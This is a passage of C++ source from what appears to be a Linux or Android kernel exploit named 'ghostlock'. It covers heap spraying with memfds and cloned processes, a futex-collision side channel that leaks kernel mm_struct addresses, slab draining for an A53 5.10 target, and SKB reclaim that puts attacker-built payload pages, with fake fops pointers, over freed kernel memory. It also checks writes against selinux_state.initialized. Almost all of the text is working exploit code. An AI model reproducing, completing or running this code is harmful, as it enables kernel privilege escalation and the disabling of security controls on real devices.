    const size_t batch = group->batch;
    const size_t trigger_refs = kernel::A53_TRIGGER_SLABS * batch;
    std::vector<int32_t> triggers;
    triggers.reserve(trigger_refs);
    kernel::pin_to_core(0);
    /* Drain pressure: these extra references keep the reclaim from resolving
     * while the target references are released in order. */
    for (size_t i = 0; i < trigger_refs; i++) {
        const int32_t fd = clone_memfd();
        if (fd < 0) {
            /* Under pressure we cannot build the full trigger set; keep what
             * we have rather than closing -1 for the rest. */
            pr_warning("A53_TRIGGER_SHORT want=%zu got=%zu\n", trigger_refs, i);
            break;
        }
        triggers.push_back(fd);
    }
    pr_info("A53_TRIGGER_READY slabs=%lu refs=%zu\n",
            static_cast<unsigned long>(kernel::A53_TRIGGER_SLABS), trigger_refs);
    /* All but the tail, let the slab settle, one reference per trigger batch,
     * then the tail. */
    for (size_t i = 0; i + 1 < batch; i++) {
        SYSCHK(close(group->held[i]));
        group->held[i] = -1;
    }
    usleep(1000 * 1000);
    for (size_t page = 0; page < kernel::A53_TRIGGER_SLABS; page++) {
        const size_t idx = page * batch;
        if (idx < triggers.size()) {
            SYSCHK(close(triggers[idx]));
        }
    }
    SYSCHK(close(group->held[batch - 1]));
    group->held[batch - 1] = -1;
    pr_info("A53_TARGET_TAIL_FREE batch=%zu\n", batch);
    delete[] group->held;
    group->held = nullptr;
    group->held_len = 0;
}
#endif /* GHOSTLOCK_TARGET_A53_5_10 */

    uintptr_t prepare_kernel_page(const memory::WriteRequest *request) {
        struct timespec t_spray;
        clock_gettime(CLOCK_MONOTONIC, &t_spray);
        /* Release every userspace reference from the preceding write before the
         * context arrays are replaced. Keeping the final post-spray memfd pinned
         * leaked one mm_struct per stage and progressively poisoned later sprays. */
        close_reclaim_sockets();
        cleanup_page_prepare_state();
        mm_objs_per_slab = kernel::ORDER3_SIZE /
                           session::g_exploit_session.profile.mm_struct_stride(kernel::MM_STRUCT_SZ);
        prepare_ctxs();

        session::g_exploit_session.heap.skb_buffer = std::make_unique<unsigned char[]>(kernel::SKB_SEND_SIZE);
        memset(skb_buf(), 0x41, kernel::SKB_SEND_SIZE);

        for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
            prepare_ctx.childs[i] = clone_child();
            prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
        }

        for (size_t i = 0; i < spray_ctx.childs.size(); i++) {
            spray_ctx.childs[i] = clone_child();
            spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
        }

        int32_t cpu_count = static_cast<int32_t>(sysconf(_SC_NPROCESSORS_ONLN));
        kernelsnitch::KernelSnitchOwner snitch = kernelsnitch::KernelSnitchOwner::create(
            session::g_exploit_session.profile.mm_struct_stride(kernel::MM_STRUCT_SZ),
            kernel::MM_ORDER, static_cast<size_t>(cpu_count), ghostlock::profile::kernelsnitch_collisions(), 0,
            static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
        /* The forked leak child borrows the shared mmap context through this
         * compatibility alias; the owner remains the only releaser. */
        auto clear_snitch_alias =
                make_scope_exit([]() noexcept { ks = nullptr; });
        ks = snitch.get();
        pr_info("[spray] mm spray + kernelsnitch ready (cpu=%d) +%lldms\n",
                cpu_count, ms_since(&t_spray));

        for (size_t i = 0; i < pre_ctx.childs.size(); i++) {
            pre_ctx.childs[i] = clone_child();
        }
        child_leak = ChildProcess(clone_leak_child());
        for (size_t i = 0; i < post_ctx.childs.size(); i++) {
            post_ctx.childs[i] = clone_child();
        }

        for (size_t i = 0; i < pre_ctx.childs.size(); i++) {
            pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
        }
        session::g_exploit_session.heap.leak_memfd.reset(open_memfd(child_leak.get()));
        for (size_t i = 0; i < post_ctx.childs.size(); i++) {
            post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
        }

        for (size_t i = 0; i < pre_ctx.childs.size(); i++) {
            kill_child(pre_ctx.childs[i]);
        }
        for (size_t i = 0; i < post_ctx.childs.size(); i++) {
            kill_child(post_ctx.childs[i]);
        }
        for (size_t i = 0; i < spray_ctx.childs.size(); i++) {
            kill_child(spray_ctx.childs[i]);
        }
        pr_info("[spray] finding futex collisions... +%lldms\n",
                ms_since(&t_spray));
        {
            struct timespec t_wait;
            clock_gettime(CLOCK_MONOTONIC, &t_wait);
            const pid_t leak_pid = child_leak.get();
            int32_t leak_status = 0;
            pid_t wp = 0;
            long long last_beat = 0;
            for (;;) {
                wp = waitpid(leak_pid, &leak_status, WNOHANG);
                if (wp == leak_pid) {
                    child_leak.mark_reaped();
                    break;
                }
                if (wp < 0) {
                    pr_warning("waitpid leak child: %m\n");
                    child_leak.mark_reaped();
                    break;
                }
                long long waited = ms_since(&t_wait);
                uint32_t timeout_ms =
                        session::g_exploit_session.profile.execution()
                        ->heap_kernelsnitch_timeout_ms;
                if (static_cast<uint64_t>(waited) >= timeout_ms) {
                    pr_warning("leak child stuck >%ums, killing it\n", timeout_ms);
                    (void) child_leak.terminate_and_wait(SIGKILL);
                    break;
                }
                if (waited - last_beat >= 2000) {
                    size_t scan_done = ks->scan_done;
                    size_t scan_total = ks->total_futexes;
                    if (scan_done > scan_total) scan_done = scan_total;
                    size_t scan_id = (scan_done * 4096) | ((scan_done * 8) % 4096);
                    if (scan_id > static_cast<size_t>FUTEX_SZ) scan_id = static_cast<size_t>FUTEX_SZ;
                    pr_info("[spray]   still finding collisions (%llds) %zu%% "
                            "(futex 0x%zx/0x%zx)...\n",
                            waited / 1000,
                            scan_total ? scan_done * 100 / scan_total : 0,
                            scan_id, (size_t) FUTEX_SZ);
                    last_beat = waited;
                }
                usleep(50000);
            }
            if (wp == leak_pid &&
                (!WIFEXITED(leak_status) || WEXITSTATUS(leak_status) != 0)) {
                pr_warning("leak child exit status=%d\n", leak_status);
            }
        }
        if (!snitch.has_collisions()) {
            pr_warning("[spray] futex collisions not found\n");
            snitch.reset();
            for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
                kill_child(prepare_ctx.childs[i]);
            }
            cleanup_page_prepare_state();
            return 0;
        }

        pr_info("[spray] futex collisions found +%lldms\n",
                ms_since(&t_spray));
#if defined(GHOSTLOCK_TARGET_A53_5_10)
        /* One leaked mm_struct is not enough here: the whole order-3 slab has
         * to come back under drain pressure, or the SKB reuse never lands on it.
         * a53_collect_full_group() hunts for a complete normal-zone slab and
         * a53_drain_group() releases it in the order that actually frees it. */
        A53ReclaimGroup group{};
        const size_t mm_stride =
                session::g_exploit_session.profile.mm_struct_stride(kernel::MM_STRUCT_SZ);
        const bool grouped =
                mm_stride &&
                a53_collect_full_group(
                        static_cast<size_t>(cpu_count), mm_stride, kernel::MM_ORDER, &group);
        uintptr_t base = grouped ? group.base : 0;
        (session::g_exploit_session.heap.current.last_mm_struct) = base;
        if (!grouped) {
            pr_warning("A53_GROUP_NONE zone=normal scan=%u\n",
                    static_cast<unsigned>(kernel::A53_PAGE_SCAN_MAX));
            snitch.reset();
            for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
                kill_child(prepare_ctx.childs[i]);
            }
            cleanup_page_prepare_state();
            return 0;
        }
        a53_drain_group(&group);
        pr_info("[spray] a53 group freed base=0x%016zx objects=%zu +%lldms\n", base,
                group.batch, ms_since(&t_spray));
#else
        (void) snitch.scan();
        pr_info("[spray] mm_struct leaked=0x%zx +%lldms\n",
                snitch.result(), ms_since(&t_spray));
        uintptr_t leaked = snitch.result();
        /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
        leaked |= static_cast<uintptr_t>(0xf) << 56;
        (session::g_exploit_session.heap.current.last_mm_struct) = leaked;
        /* mm_structs live in the direct map */
        if (leaked == static_cast<uintptr_t>(-1) ||
            leaked < kernel::KERNELSNITCH_IDENTITY_START ||
            leaked >= kernel::g_direct_map_end) {
            pr_warning("KernelSnitch mm_struct leak failed\n");
            snitch.reset();
            for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
                kill_child(prepare_ctx.childs[i]);
            }
            cleanup_page_prepare_state();
            return 0;
        }

        uintptr_t base = leaked & ~(kernel::ORDER3_SIZE - 1);
#endif
        if (!prepare_skb_payload(base, request)) {
            snitch.reset();
            for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
                kill_child(prepare_ctx.childs[i]);
            }
            cleanup_page_prepare_state();
            return 0;
        }

        SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv.data()));
        session::g_exploit_session.heap.current.state = memory::PayloadPageState::Current;
        int32_t sndbuf = 1 << 20;
        setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        int32_t reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
        if (reclaim_flags >= 0) {
            fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
        }
        std::array<int32_t, 2> pcp_shaping_sv{};
        SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv.data()));

        struct iovec iov{};
        iov.iov_base = skb_buf();
        iov.iov_len = kernel::SKB_SEND_SIZE;

        struct msghdr msg{};
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;

        SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));

        kernel::pin_to_core(static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
        sched_yield();
        sched_yield();
        sched_yield();
        sched_yield();
        for (size_t i = 0; i < pre_ctx.childs.size(); i++) {
            SYSCHK(close(pre_ctx.memfds[i]));
            pre_ctx.memfds[i] = -1;
        }
        for (size_t i = 0; i < post_ctx.childs.size() - 1; i++) {
            SYSCHK(close(post_ctx.memfds[i]));
            post_ctx.memfds[i] = -1;
        }
        for (size_t i = 0; i < spray_ctx.childs.size(); i += mm_objs_per_slab) {
            SYSCHK(close(spray_ctx.memfds[i]));
            spray_ctx.memfds[i] = -1;
        }

        SYSCHK(close(pcp_shaping_sv[0]));
        SYSCHK(close(pcp_shaping_sv[1]));
        sched_yield();
        sched_yield();
        sched_yield();
        sched_yield();
        /* Reap the snitch child's memfd: closing it is what drops the
         * mm_struct reference the spray depends on (the previous SYSCHK_pr
         * expansion dropped the close call). */
        const int32_t leak_fd = session::g_exploit_session.heap.leak_memfd.release();
        if (close(leak_fd) != 0) {
            pr_error("SYSCHK(close(memfd_leak)): %m\n");
        }
        session::g_exploit_session.heap.leak_memfd.reset();
        for (int32_t i = 0; i < kernel::SKB_RECLAIM_SENDS; i++) {
            errno = 0;
            ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
            if (sent <= 0) {
                break;
            }
        }
        pr_info("[spray] payload ready +%lldms\n", ms_since(&t_spray));
        snitch.reset();

        for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
            SYSCHK(close(prepare_ctx.memfds[i]));
            prepare_ctx.memfds[i] = -1;
            kill_child(prepare_ctx.childs[i]);
        }

        return base;
    }

    uintptr_t prepare_good_kernel_page(const memory::WriteRequest &request) {
        uint32_t max_attempts = session::g_exploit_session.profile.heap_prepare_max_attempts();
        struct timespec t_good;
        clock_gettime(CLOCK_MONOTONIC, &t_good);
        struct timespec deadline = t_good;
        uint64_t timeout_ns =
                static_cast<uint64_t>(session::g_exploit_session.profile.heap_prepare_timeout_ms()) * 1000000ULL;
        deadline.tv_sec += static_cast<time_t>(timeout_ns / 1000000000ULL);
        deadline.tv_nsec += static_cast<long>(timeout_ns % 1000000000ULL);
        if (deadline.tv_nsec >= 1000000000L) {
            deadline.tv_sec++;
            deadline.tv_nsec -= 1000000000L;
        }
        for (uint32_t attempt = 1; attempt <= max_attempts; attempt++) {
            uintptr_t base = prepare_kernel_page(&request);
            if (base) {
                memory::PayloadWriteLayout layout = {
                    .parent = (session::g_exploit_session.heap.current.fake_parent),
                    .right = (session::g_exploit_session.heap.current.fake_right),
                    .left = (session::g_exploit_session.heap.current.fake_left),
                    .fops = (session::g_exploit_session.heap.current.fake_fops),
                };
                if (!payload_write_layout_matches_request(&request, &layout)) {
                    pr_warning("payload arm mismatch preserve_child=%d right=%016zx\n",
                               request.preserve_child, layout.right);
                } else if (!payload_write_layout_accepts_page(&request, &layout)) {
                    pr_warning("page %016zx stores an even byte over "
                               "selinux_state.initialized; taking another\n", base);
                } else {
                    pr_info("prepare_kernel_page ok attempt=%u +%lldms\n", attempt,
                            ms_since(&t_good));
                    return base;
                }
            }
            struct timespec now;
            clock_gettime(CLOCK_MONOTONIC, &now);
            if (now.tv_sec > deadline.tv_sec ||
                (now.tv_sec == deadline.tv_sec && now.tv_nsec >= deadline.tv_nsec)) {
                pr_warning("prepare_kernel_page timeout after %u attempts\n", attempt);
                break;
            }
            pr_warning("prepare_kernel_page retry %u/%u +%lldms\n", attempt,
                       max_attempts, ms_since(&t_good));
        }
        return 0;
    }
} // namespace ghostlock::support
